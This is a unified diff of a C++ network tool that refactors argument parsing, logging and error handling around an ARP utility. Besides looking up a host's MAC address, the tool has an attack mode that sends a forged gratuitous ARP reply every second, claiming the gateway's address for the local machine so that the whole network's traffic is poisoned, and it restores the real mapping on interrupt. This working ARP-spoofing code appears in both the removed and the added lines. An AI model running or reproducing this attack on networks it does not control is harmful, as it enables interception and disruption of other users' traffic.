@@ -1,55 +1,62 @@
-#include "transport/transport.h"
+#include "traffic/transport.h"
+#include "toolkit/logging.h"
+#include "toolkit/args.h"
 #include <signal.h>
 #include <atomic>
 #include <thread>
-#include <iostream>
-
-DEFINE_bool(attack, false, "attack whole network by pretending myself to be gateway");
 
 std::atomic<bool> end_attack = false;
 
-void on_interrupt(int) { end_attack = true; }
+void onInterrupt(int) { end_attack = true; }
 
 int main(int argc, char* argv[])
 {
-    NT_TRY
+    MY_TRY
     toolkit::Args args(argc, argv);
+    args.optional("attack,a", po::bool_switch(),
+                  "attack whole network by pretending myself to be gateway");
+    args.positional("ip", po::value<std::string>()->default_value(""), "ipv4 address", 1);
     args.parse();
-    if (argc < 2 && !FLAGS_attack) {
-        LOG(ERROR) << "empty ipv4 address, please input ip";
+
+    auto opt_attack = args.get<bool>("attack");
+    auto opt_ip = args.get<std::string>("ip");
+
+    if (opt_ip.empty() && !opt_attack) {
+        ELOG("empty ipv4 address, please input ip");
         return -1;
     }
 
-    ip4 ip = argc >= 2 ? ip4(argv[1]) : ip4::zeros;
-    auto& apt = adaptor::fit(ip);
-    pcap_t* handle = transport::open_adaptor(apt);
-    std::shared_ptr<void> handle_guard(nullptr, [&](void*) { pcap_close(handle); });
+    net::Ip4 ip = !opt_ip.empty() ? net::Ip4(opt_ip) : net::Ip4::kZeros;
+    auto& apt = net::Adaptor::fit(ip);
+    void* handle;
+    CHECK_ERR_RET_INT(net::Transport::open(apt, handle));
+    auto handle_guard = toolkit::scopeExit([&] { net::Transport::close(handle); });
 
-    if (!FLAGS_attack) {
-        mac mac_;
-        if (transport::ip2mac(handle, ip, mac_)) {
-            std::cout << ip.to_str() << " is at " << mac_.to_str() << "." << std::endl;
+    if (!opt_attack) {
+        net::Mac mac;
+        if (net::Transport::ip2mac(handle, ip, mac) == MyErrCode::kOk) {
+            ILOG("{} is at {}", ip, mac);
         } else {
-            std::cout << ip.to_str() << " is offline." << std::endl;
+            ILOG("{} is offline", ip);
         }
     } else {
-        signal(SIGINT, on_interrupt);
-        mac gateway_mac;
-        if (transport::ip2mac(handle, apt.gateway, gateway_mac)) {
-            LOG(INFO) << "gateway {} is at {}"_format(apt.gateway.to_str(), gateway_mac.to_str());
+        signal(SIGINT, onInterrupt);
+        net::Mac gateway_mac;
+        if (net::Transport::ip2mac(handle, apt.gateway, gateway_mac) == MyErrCode::kOk) {
+            ILOG("gateway {} is at {}", apt.gateway, gateway_mac);
         }
-        LOG(INFO) << "forging gateway's mac to {}..."_format(apt.mac_.to_str());
-        auto lie = packet::arp(apt.mac_, apt.gateway, apt.mac_, apt.ip, true);
+        ILOG("forging gateway's mac to {}...", apt.mac);
+        auto lie = net::Packet::arp(apt.mac, apt.gateway, apt.mac, apt.ip, true);
         while (!end_attack) {
-            transport::send(handle, lie);
-            std::this_thread::sleep_for(1000ms);
+            CHECK_ERR_RET_INT(net::Transport::send(handle, lie));
+            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
         }
-        LOG(INFO) << "attack stopped";
-        if (transport::ip2mac(handle, apt.gateway, gateway_mac, false)) {
-            auto truth = packet::arp(gateway_mac, apt.gateway, apt.mac_, apt.ip, true);
-            transport::send(handle, truth);
-            LOG(INFO) << "gateway's mac restored to {}"_format(gateway_mac.to_str());
+        ILOG("attack stopped");
+        if (net::Transport::ip2mac(handle, apt.gateway, gateway_mac, false) == MyErrCode::kOk) {
+            auto truth = net::Packet::arp(gateway_mac, apt.gateway, apt.mac, apt.ip, true);
+            CHECK_ERR_RET_INT(net::Transport::send(handle, truth));
+            ILOG("gateway's mac restored to {}", gateway_mac);
         }
     }
-    NT_CATCH
+    MY_CATCH
 }
